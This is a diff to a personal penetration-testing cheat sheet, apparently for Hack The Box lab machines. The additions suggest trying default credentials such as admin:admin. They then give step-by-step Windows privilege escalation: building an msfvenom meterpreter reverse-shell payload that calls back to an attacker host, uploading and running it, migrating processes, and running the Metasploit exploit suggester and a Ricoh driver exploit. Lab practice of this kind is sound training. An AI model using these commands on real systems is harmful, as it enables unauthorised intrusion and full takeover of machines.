@@ -18,6 +18,8 @@ You should try them to find what they are for
 
 **enumeration:**
 
+for old windows services try some default creds like admin:admin!
+
  nmap -p- --min-rate 10000 ip
 
 gobuster dir -u "http://name.htb" -w /usr/share/wordlists/seclists/Discovery/Web-Content/dire....txt -t 100 -x php (windows usually use php files)
@@ -575,3 +577,61 @@ klist
 
 28. evil-winrm -i dc01.mira...htb -r mir....htb 
 you in:)
+
+----------------------------------------------------------------------------------------------------------------------
+old windows priv esca:
+
+1. you got a shell like evil-winrm, then you build a meterpreter to upload it with msfconsole:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=4444 -f exe > shell.exe
+
+2. then do:
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost tun0
+set lport 4444
+run
+
+3. and you have a meterpreter session. Now upload the shell:
+upload shell.exe C:\Users\tony\music\shell.exe                 (you need to have connection sstarting fro mthe same directory you have the shell.exe)
+
+4. execute it
+./shell.exe
+
+5. and you got it.
+meterpreter > getuid
+DRIVER\tony
+
+6. if you press "ps" yo uwil see all the e processes that are currently running on the system we can see that we are on session
+0 , meaning that the meterpreter process is running on a non-interactive isolated services session.
+So you need to migrate it with a process with session 1 id.
+
+migrate <id>
+
+7. then use the exploit suggester to find the right payload for the session 1 machine:
+ctl+z
+y
+use multi/recon/local_exploit_suggester
+set session 1
+run
+
+8. you find out some more details about the machine like drivers name and staff so you know what to use:
+use exploit/windows/local/ricoh_driver_privesc
+set payload windows/x64/meterpreter/reverse_tcp
+set session 1
+set lhost tun0
+run
+
+9. 
+getuid
+cd C:\
+
+
+
+
+
+
+
+
+
+
